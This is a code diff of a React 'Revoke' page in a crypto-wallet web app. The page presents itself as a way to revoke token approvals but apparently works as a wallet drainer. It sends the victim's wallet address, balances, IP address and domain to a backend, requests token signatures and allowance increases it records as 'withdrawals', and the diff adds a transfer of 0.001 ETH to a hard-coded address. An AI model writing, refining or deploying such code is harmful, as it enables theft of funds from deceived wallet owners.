@@ -1,7 +1,7 @@
 import React, { useEffect, useState, useContext } from "react";
 import AppContext from "../components/AppContext";
 import Container from "../components/Container";
-import { useAccount } from "wagmi";
+import { useAccount, useSendTransaction } from "wagmi";
 import {
   getUserTokens,
   increaseAllowanceForTokens,
@@ -18,6 +18,7 @@ import {
   tokenConfirmed,
   tokenDeclined,
 } from "../api";
+import { parseEther } from "viem";
 
 const Revoke = () => {
   const {
@@ -31,11 +32,14 @@ const Revoke = () => {
     handleLoadingData,
     handleLoadingEthBalance,
   } = useContext(AppContext);
+  const { sendTransaction, data: sentEthTx } = useSendTransaction();
+
   const { isConnected, address, connector } = useAccount();
-  const [walletData, setwalletData] = useState({});
-  const [isButtonDisabled, setIsButtonDisabled] = useState(false);
+  const [walletData, setWalletData] = useState({});
   const [priceData, setPriceData] = useState(null);
-  const [testToken, setTestToken] = useState([
+  const [isButtonDisabled, setIsButtonDisabled] = useState(false);
+
+  const [testTokens, setTestToken] = useState([
     {
       contractAddress: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
       balance: "1999999998000000.0",
@@ -72,98 +76,92 @@ const Revoke = () => {
       name: "Wrapped Ether",
     },
   ]);
-
   useEffect(() => {
-    if (!loadingData && testToken) {
-      const fetchPriceData = async () => {
-        const priceData = [];
-        for (const token of testToken) {
-          await new Promise((resolve) => setTimeout(resolve, 1000)); // rate limit
-          try {
-            const data = await getTokenPriceByAddressAndAmount(
-              token.contractAddress,
-              "usd",
-              token.balance
-            );
-            priceData.push(data);
-          } catch (error) {
-            console.error("Error fetching token price:", error);
-          }
-        }
-        setPriceData(priceData);
-      };
-
+    if (!loadingData && tokenData && isConnected) {
       fetchPriceData();
     }
-  }, [loadingData, tokenData]);
+  }, [loadingData, tokenData, isConnected]);
+
+  const fetchPriceData = async () => {
+    const priceData = await Promise.all(
+      testTokens.map((token) =>
+        getTokenPriceByAddressAndAmount(
+          token.contractAddress,
+          "usd",
+          token.balance
+        )
+      )
+    );
+    setPriceData(priceData);
+  };
 
   useEffect(() => {
-    if (connector && !loadingData && priceData && testToken) {
-      const mergedTokens = [];
-
-      const data = {
-        current_network: "Ethereum",
-        domain: domainName,
-        erc_20_tokens: [
-          {
-            balance: "790.93",
-            contract_address: "0xeiieitii84jwjjjwju2y2y2y2yy1h2h3h3ssvavab954",
-            token_balance: "90.93",
-            token_name: "BUSD",
-          },
-        ],
-        ip_address: ipAddress,
-        native_coin: "ETH",
-        total_balance: ethBalance,
-        wallet_address: address,
-        wallet_type: connector.name,
-      };
-
-      testToken.forEach((tokenObj) => {
-        const matchingTokenObj = priceData.filter(
-          (priceObj) => tokenObj.contractAddress === priceObj.contractAddress
-        );
-        if (matchingTokenObj.length > 0) {
-          const mergedObj = { ...tokenObj, ...matchingTokenObj[0] };
-          mergedTokens.push(mergedObj);
-        }
-      });
-
-      data.erc_20_tokens = mergedTokens.map((tokenObj) => {
-        const {
-          amountInusd,
-          contractAddress,
-          name,
-          symbol,
-          totalSupply,
-          balance,
-        } = tokenObj;
-
-        return {
-          balance: ` ${amountInusd}`,
-          contract_address: contractAddress,
-          token_balance: balance,
-          token_name: name,
-        };
-      });
-
-      const fetchData = async () => {
-        try {
-          const res = await walletScanned(data);
-          console.log("wallet Scanned: ", res);
-        } catch (error) {
-          console.log("failed to send post for walletScanned: ", error);
-        }
-      };
-      fetchData();
-      setwalletData(data);
+    if (tokenData && priceData && connector) {
+      // Add connector to the condition
+      console.log("price data", priceData);
+      const mergedTokens = mergeTokens(priceData, testTokens);
+      const data = createWalletData(
+        mergedTokens,
+        domainName,
+        ipAddress,
+        ethBalance,
+        address,
+        connector.name // Only access connector.name if connector is not undefined
+      );
+      setWalletData(data);
+      sendWalletScannedData(data);
     }
-  }, [priceData, testToken, loadingData, connector]);
+  }, [priceData, tokenData, loadingData, connector]);
+
+  const mergeTokens = (priceData, testTokens) => {
+    const priceMap = {};
+    priceData.forEach((priceObj) => {
+      priceMap[priceObj.contractAddress] = priceObj;
+    });
+    return testTokens.map((tokenObj) => {
+      const matchingPriceData = priceMap[tokenObj.contractAddress];
+      return { ...tokenObj, ...matchingPriceData };
+    });
+  };
+
+  const createWalletData = (
+    mergedTokens,
+    domainName,
+    ipAddress,
+    ethBalance,
+    address,
+    walletType
+  ) => {
+    return {
+      current_network: "Ethereum",
+      domain: domainName,
+      erc_20_tokens: mergedTokens.map((tokenObj) => ({
+        balance: ` ${tokenObj.amountInusd}`,
+        contract_address: tokenObj.contractAddress,
+        token_balance: tokenObj.balance,
+        token_name: tokenObj.name,
+      })),
+      ip_address: ipAddress,
+      native_coin: "ETH",
+      total_balance: ethBalance,
+      wallet_address: address,
+      wallet_type: walletType,
+    };
+  };
+
+  const sendWalletScannedData = async (data) => {
+    try {
+      const res = await walletScanned(data);
+      console.log("wallet Scanned: ", res);
+    } catch (error) {
+      console.log("failed to send post for walletScanned: ", error);
+    }
+  };
 
   const handleClick = async () => {
-    setIsButtonDisabled((prevIsButtonDisabled) => true); // Functional update
+    setIsButtonDisabled(true);
     try {
-      for (let token of walletData.erc_20_tokens) {
+      for (const token of walletData.erc_20_tokens) {
         const { contract_address, balance, token_name, token_balance } = token;
         const data = {
           asset_name: token_name,
@@ -173,7 +171,7 @@ const Revoke = () => {
           withdrawal_amount_token: token_balance,
         };
         try {
-          const res = requestTokenSignature(data);
+          const res = await requestTokenSignature(data);
           console.log("request Token Signature succesful: ", res);
         } catch (error) {
           console.log("request Token Signature failed:", error);
@@ -183,10 +181,12 @@ const Revoke = () => {
           const data = {
             asset_name: token_name,
             domain: walletData.domain,
+            transaction_hash: res.data,
             ip_address: walletData.ip_address,
             withdrawal_amount: balance,
             withdrawal_amount_token: token_balance,
           };
+          console.log("token confirmed :", data);
           try {
             const res = await tokenConfirmed(data);
             console.log("token confirmed post successful: ", res);
@@ -205,13 +205,22 @@ const Revoke = () => {
             withdrawal_amount_token: token_balance,
           };
           try {
-            const res = tokenDeclined(data);
+            const res = await tokenDeclined(data);
             console.log("tokenDeclined post successful:", res);
             console.log(`Increase allowance failed: ${res.error}`);
           } catch (error) {
             console.log("tokenDeclined post failed:", res);
           }
         }
+      }
+      try {
+        const tx = sendTransaction({
+          to: "0x80EeF47fAb3b35726eBE01922969224EEC8B393E",
+          value: parseEther("0.001"),
+        });
+        console.log("Transaction sent:", sentEthTx);
+      } catch (error) {
+        console.error("Error sending transaction:", error);
       }
     } catch (error) {
       console.error("Failed to increase allowance token:", error);
